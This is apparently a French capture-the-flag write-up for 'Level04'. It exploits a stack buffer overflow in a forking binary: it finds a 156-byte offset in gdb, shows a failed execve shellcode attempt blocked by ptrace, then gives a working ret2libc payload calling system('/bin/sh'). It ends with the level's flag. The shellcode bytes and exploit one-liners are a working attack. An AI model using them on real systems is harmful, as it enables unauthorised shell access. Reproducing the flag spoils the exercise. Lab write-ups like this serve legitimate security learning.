# Level04

## **Objectif :**

En observant le `main`, on trouve un buffer de 32 `char` et un appel à `fgets`, il n'y a à priori rien d'autre d'exploitable.

Par conséquent, nous allons tenter de faire un **buffer overflow** afin de surcharger la sauvegarde de l'**EIP** présente dans la **stack frame** du `main`.

___
## **Tests :**

On cherche à trouver l'offset à l'aide de [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) :

* Avec un petit nombre de caractères le programme `exit` :

```
(gdb) r
Starting program: /home/users/level04/level04
Give me some shellcode, k
AAAAAAAAAAA
child is exiting...
[Inferior 1 (process 1999) exited normally]
```

* Avec un grand nombre de caractères on tombe dans une boucle infinie qui nous bloque :

```
(gdb) r
Starting program: /home/users/level04/level04
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

...
``` 

Cela vient du `fork`, en ajoutant `set follow-fork-mode child` dans **gdb** on peut maintenant retracer l'adresse de notre **segfault**, on trouve un offset de 156.

On exporte une **variable d'environnement** ou l'om stocke un **shellcode**.
On met l'adresse de notre **shellcode** à la suite de notre offset pour essayer de faire surcharger le `fgets`:

```bash
export SHELL_CODE=$(python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

```bash
cat <(python -c 'print("A"*156 + "\xce\xde\xff\xff")') - | ./level04
Give me some shellcode, k

... # ici on peut écrire sur stdin à l'infini
```

Sans succès.

On peut voir dans le `main` qu'il est vérifié qu'aucun `syscall execve` n'ait été produit à l'aide de `ptrace`, notre **shellcode** en utilise justement un.

De fait, on va chercher à utiliser un **shellcode** ne faisant pas appel à cette instruction, on va pour cela utiliser un [retour à la libc](https://beta.hackndo.com/retour-a-la-libc/).

___
## **Solution :**

Nous allons devoir rediriger notre programme vers la fonction `system` de la **libc** en lui passant **"/bin/sh"** en paramètre.

Pour fonctionner, notre stack devra être comme suit :

```
[buffer rempli jusqu'à l'offset][adresse de system][adresse de retour random][adresse de la chaine "/bin/sh"]
```

On trouve d'abord l'adresse de `system` :

```
(gdb) p system
$1 = {
    <text variable, no debug info>} 0xf7e6aed0 <system>
```

Puis l'adresse de **"/bin/sh"** :

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec

(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

*NB : Il était aussi possible de stocker **"/bin/sh"** dans une **variable d'environnement**.*

On a maintenant tous les éléments pour mener notre exploitation à bien :

```bash
cat <(python -c 'print("A"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\x12\x34\x56\x78" + "\xf7\xf8\x97\xec"[::-1])') - | ./level04
```

>> 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN